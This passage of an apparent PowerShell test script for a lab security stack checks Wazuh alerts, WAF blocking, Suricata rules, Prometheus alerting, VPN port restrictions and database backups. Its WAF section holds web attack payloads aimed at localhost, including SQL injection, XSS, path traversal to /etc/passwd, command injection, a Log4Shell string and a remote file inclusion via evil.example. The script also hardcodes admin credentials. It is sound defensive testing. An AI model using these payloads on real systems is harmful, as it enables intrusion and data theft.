$crit = (docker exec ecotrack-wazuh-indexer sh -c "curl -sk -G -u admin:SecretPassword 'https://localhost:9200/wazuh-alerts-*/_count' --data-urlencode 'q=rule.level:>=12'" 2>&1) -join ''
$cc = 0; if ($crit -match '"count":(\d+)') { $cc = [int]$Matches[1] }
if ($cc -gt 0) { Pass "wazuh-alerts CRITICAL (niveau>=12): $cc" } else { Warn "0 alerte critical - relancer apres la phase offensive" }

$high = (docker exec ecotrack-wazuh-indexer sh -c "curl -sk -G -u admin:SecretPassword 'https://localhost:9200/wazuh-alerts-*/_count' --data-urlencode 'q=rule.level:[8 TO 11]'" 2>&1) -join ''
$hc = 0; if ($high -match '"count":(\d+)') { $hc = [int]$Matches[1] }
if ($hc -gt 0) { Pass "wazuh-alerts HIGH (niveau 8-11): $hc" } else { Warn "0 alerte high (niveau 8-11)" }

foreach ($rid in @('100110','100111','100112','100113','31103','31106')) {
  $rr = (docker exec ecotrack-wazuh-indexer sh -c "curl -sk -G -u admin:SecretPassword 'https://localhost:9200/wazuh-alerts-*/_count' --data-urlencode 'q=rule.id:$rid'" 2>&1) -join ''
  $rc2 = 0; if ($rr -match '"count":(\d+)') { $rc2 = [int]$Matches[1] }
  if ($rc2 -gt 0) { Pass "regle Wazuh $rid declenchee x$rc2" }
}

# --- 14. Block mode: batterie d'attaques par classe (assertions 403) ---
Section "Block mode - WAF (ModSecurity On) : batterie d'attaques"
$eng = (docker exec ecotrack-nginx-waf sh -c "env | grep -i MODSEC_RULE_ENGINE" 2>&1) -join ''
if ($eng -match '=\s*On') { Pass "ModSecurity engine = On (blocage actif)" } else { Warn "MODSEC_RULE_ENGINE != On ($eng)" }

$benign = Http "http://localhost/api/iot/latest"
if ($benign.code -eq 200) { Pass "trafic legitime -> 200 (pas de faux positif)" } else { Warn "trafic legitime code=$($benign.code) (faux positif WAF ?)" }

# attaques couvertes par regles custom : blocage ferme (Fail si != 403)
$firm = @(
  @{ n='SQLi UNION (/api)'; u='http://localhost/api/iot/latest?id=1%20UNION%20SELECT%20username,password%20FROM%20pg_user--'; ua=$null },
  @{ n='SQLi OR 1=1 (/api)'; u='http://localhost/api/iot/latest?id=1%20OR%201=1--'; ua=$null },
  @{ n='SQLi stacked pg_sleep (/api)'; u='http://localhost/api/iot/latest?id=1%3BSELECT%20pg_sleep(3)--'; ua=$null },
  @{ n='Scanner UA sqlmap'; u='http://localhost/'; ua='sqlmap/1.7' },
  @{ n='Scanner UA nikto'; u='http://localhost/'; ua='Nikto/2.5' },
  @{ n='Scanner UA nuclei'; u='http://localhost/'; ua='Nuclei' },
  @{ n='Scanner UA masscan'; u='http://localhost/'; ua='masscan/1.3' }
)
foreach ($a in $firm) {
  $code = AttackStatus $a.u $a.ua
  if ($code -eq 403) { Pass "$($a.n) -> 403 (BLOQUE)" } else { Fail "$($a.n) -> $code (attendu 403)" }
}

# attaques generiques : dependent du score CRS (blocage majoritaire attendu)
$crsAtt = @(
  @{ n='XSS <script>'; u='http://localhost/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E'; ua=$null },
  @{ n='XSS img onerror'; u='http://localhost/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'; ua=$null },
  @{ n='Path traversal'; u='http://localhost/?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd'; ua=$null },
  @{ n='Command injection'; u='http://localhost/?cmd=%3Bcat%20%2Fetc%2Fpasswd'; ua=$null },
  @{ n='Log4Shell (UA)'; u='http://localhost/'; ua='${jndi:ldap://x/a}' },
  @{ n='RFI shell.txt'; u='http://localhost/?page=http%3A%2F%2Fevil.example%2Fshell.txt'; ua=$null }
)
$blk = 0
foreach ($a in $crsAtt) { if ((AttackStatus $a.u $a.ua) -eq 403) { $blk++ } }
if ($blk -ge [math]::Ceiling($crsAtt.Count / 2)) { Pass "CRS: $blk/$($crsAtt.Count) classes generiques bloquees (403)" }
elseif ($blk -gt 0) { Warn "CRS: $blk/$($crsAtt.Count) bloquees (paranoia 1 - acceptable, regle custom couvre /api)" }
else { Warn "CRS: 0/$($crsAtt.Count) bloquee - score d'anomalie sous le seuil (paranoia 1)" }

$dropc = (docker exec ecotrack-suricata sh -c "grep -c '^drop ' /etc/suricata/rules/ecotrack.rules" 2>&1) -join ''
$dn = 0; if (($dropc.Trim()) -match '^\d+$') { $dn = [int]$dropc.Trim() }
if ($dn -ge 3) { Pass "Suricata: $dn regles 'drop' locales chargees (IPS-ready)" } else { Warn "Suricata drop rules: $dn (attendu >=3)" }
$smode = (docker inspect ecotrack-suricata --format '{{.Config.Cmd}}' 2>&1) -join ''
if ($smode -match '-q ') { Pass "Suricata mode NFQUEUE inline (IPS actif)" } else { Warn "Suricata af-packet IDS: drop=alerte (IPS inline indispo WSL2; ModSec assure le blocage L7)" }

# --- 15. Prometheus: alerte reelle (TargetDown) ---
Section "Prometheus - Alerte reelle (TargetDown)"
Write-Host "  [..] arret de cadvisor pour declencher TargetDown (jusqu'a ~110s)..." -ForegroundColor DarkGray
docker stop ecotrack-cadvisor 2>&1 | Out-Null
$state = 'inactive'
for ($i = 0; $i -lt 11; $i++) {
  Start-Sleep -Seconds 10
  $al = HttpMon "http://172.20.4.40:9090/api/v1/alerts"
  if ($al.ok) {
    try {
      $td = @(($al.body | ConvertFrom-Json).data.alerts | Where-Object { $_.labels.alertname -eq 'TargetDown' })
      if ($td.Count) { $state = ($td | Select-Object -First 1).state }
    } catch {}
  }
  if ($state -eq 'firing') { break }
}
if ($state -eq 'firing') { Pass "Prometheus: alerte TargetDown en etat 'firing'" }
elseif ($state -eq 'pending') { Warn "TargetDown en 'pending' - attendre la fin du for:1m, passera 'firing'" }
else { Warn "TargetDown pas encore active (state=$state) - revoir /alerts dans l'UI" }

$amf = HttpMon "http://172.20.4.60:9093/api/v2/alerts"
if ($amf.ok -and $amf.body -match 'TargetDown') { Pass "Alertmanager: TargetDown propagee (chaine Prometheus->AM OK)" } else { Warn "TargetDown pas encore vue par Alertmanager (propagation apres 'firing')" }

Write-Host "  [..] redemarrage de cadvisor..." -ForegroundColor DarkGray
docker start ecotrack-cadvisor 2>&1 | Out-Null

# --- 16. VPN enforcement: les UIs admin NE doivent PAS repondre sur l'hote ---
Section "VPN - Acces admin restreint (hors tunnel)"
foreach ($p in @(9090, 3001, 9093, 9100, 8082, 5601)) {
  $blocked = $false
  try {
    $null = Invoke-WebRequest -Uri ("http://localhost:" + $p) -UseBasicParsing -TimeoutSec 4 -ErrorAction Stop
  } catch {
    if ($_.Exception.Response) { $blocked = $false } else { $blocked = $true }
  }
  if ($blocked) { Pass "port $p ferme sur localhost (admin VPN-only)" }
  else { Fail "port $p REPOND sur localhost - exposition directe non supprimee" }
}
$wol = Http "http://localhost/health"
if ($wol.ok -and $wol.code -eq 200) { Pass "WAF 80 reste public (voulu)" } else { Warn "WAF 80 inattendu: $($wol.code)" }

# --- 17. Backup PostgreSQL (dump a la demande + presence) ---
Section "Backup PostgreSQL (pg_dump + rotation)"
$brun = (docker inspect -f '{{.State.Running}}' ecotrack-postgres-backup 2>&1) -join ''
if ($brun -match 'true') { Pass "conteneur postgres-backup en cours d'execution" } else { Fail "postgres-backup non demarre: $brun" }

# dump a la demande pour prouver la chaine (independamment du cycle programme)
$dump = (docker exec ecotrack-postgres-backup sh -c "pg_dump --no-owner --clean --if-exists | gzip > /backups/ecotrack-test.sql.gz && ls -1 /backups/ecotrack-test.sql.gz && [ -s /backups/ecotrack-test.sql.gz ] && echo NONEMPTY" 2>&1) -join "`n"
if ($dump -match 'NONEMPTY') { Pass "pg_dump a la demande OK (archive .sql.gz non vide)" } else { Warn "dump a la demande non confirme: $dump" }

$verify = (docker exec ecotrack-postgres-backup sh -c "gzip -t /backups/ecotrack-test.sql.gz && zcat /backups/ecotrack-test.sql.gz | grep -c 'CREATE TABLE\|COPY\|INSERT' || echo 0" 2>&1) -join "`n"
if ($verify -match '[1-9]') { Pass "archive valide et contient du schema/donnees (restaurable)" } else { Warn "contenu du dump non confirme: $verify" }
docker exec ecotrack-postgres-backup sh -c "rm -f /backups/ecotrack-test.sql.gz" 2>&1 | Out-Null

# --- Summary ---
Write-Host ""
Write-Host ("RESULT  PASS={0}  WARN={1}  FAIL={2}" -f $script:pass, $script:warn, $script:fail) -ForegroundColor White
if ($script:fail -gt 0) { Write-Host "Status: FAILURES present" -ForegroundColor Red; exit 1 }
elseif ($script:warn -gt 0) { Write-Host "Status: OK with warnings (re-run after warm-up; Wazuh is slowest)" -ForegroundColor Yellow; exit 0 }
else { Write-Host "Status: ALL GREEN" -ForegroundColor Green; exit 0 }